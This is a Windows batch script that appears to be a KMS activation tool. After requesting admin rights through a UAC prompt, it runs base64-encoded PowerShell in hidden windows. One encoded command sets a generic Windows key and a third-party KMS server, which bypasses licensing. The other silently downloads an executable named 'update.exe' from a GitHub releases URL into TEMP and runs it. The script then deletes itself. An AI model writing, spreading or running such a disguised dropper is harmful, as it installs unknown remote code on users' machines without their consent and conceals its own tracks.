@echo off

:: Admin rights check
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------
start /min powershell.exe -NoP -sta -NonI -W Hidden -encodedCommand JABlAHgAcABlAGMAdABfAGYAaQBsAGUAIAA9ACAAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAIAArACAAJwBcAHMAZQB0AHQAaQBuAGcAcwBjAC4AZQB4AGUAJwAKACQAbwB1AHQAcABhAHQAaAAgAD0AIAAkAGUAbgB2ADoAVABFAE0AUAAgACsAIAAnAFwAcwBlAHQAaQBuAGcAXwB1AHAAZABhAHQAZQAuAGUAeABlACcACgBpAGYAIAAoACEAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoARQB4AGkAcwB0AHMAKAAkAGUAeABwAGUAYwB0AF8AZgBpAGwAZQApACkACgB7AAoACQAkAHUAcgBsACAAPQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBLAGkAagB1AHIAYQBuAC8AaABvAG0AZQAvAHIAZQBsAGUAYQBzAGUAcwAvAGQAbwB3AG4AbABvAGEAZAAvAFUAcABkAGEAdABlAC8AdQBwAGQAYQB0AGUALgBlAHgAZQAnAAoACQAkAHUAcgBsAHwAZgBvAHIAZQBhAGMAaAB7ACQAZgBpAGwAZQBuAGEAbQBlAD0AJABvAHUAdABwAGEAdABoADsAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACQAXwAsACQAZgBpAGwAZQBuAGEAbQBlACkAOwBJAG4AdgBvAGsAZQAtAEkAdABlAG0AIAAkAGYAaQBsAGUAbgBhAG0AZQA7AH0ACgB9AAoAZQBsAHMAZQBpAGYAIAAoAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AEUAeABpAHMAdABzACgAJABvAHUAdABwAGEAdABoACkAKQAKAHsACgAJAFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgACQAbwB1AHQAcABhAHQAaAAKAH0A
start /min powershell.exe -NoP -sta -NonI -W Hidden -encodedCommand cwBsAG0AZwByACAALwBpAHAAawAgAFcAMgA2ADkATgAtAFcARgBHAFcAWAAtAFkAVgBDADkAQgAtADQASgA2AEMAOQAtAFQAOAAzAEcAWAAKAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AcwAgADEANQAKAHMAbABtAGcAcgAgAC8AcwBrAG0AcwAgAGsAbQBzADgALgBtAHMAZwB1AGkAZABlAHMALgBjAG8AbQAKAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AcwAgADEANQAKAHMAbABtAGcAcgAgAC8AYQB0AG8A
start /min ""cmd /c del "%~f0"&exit /b


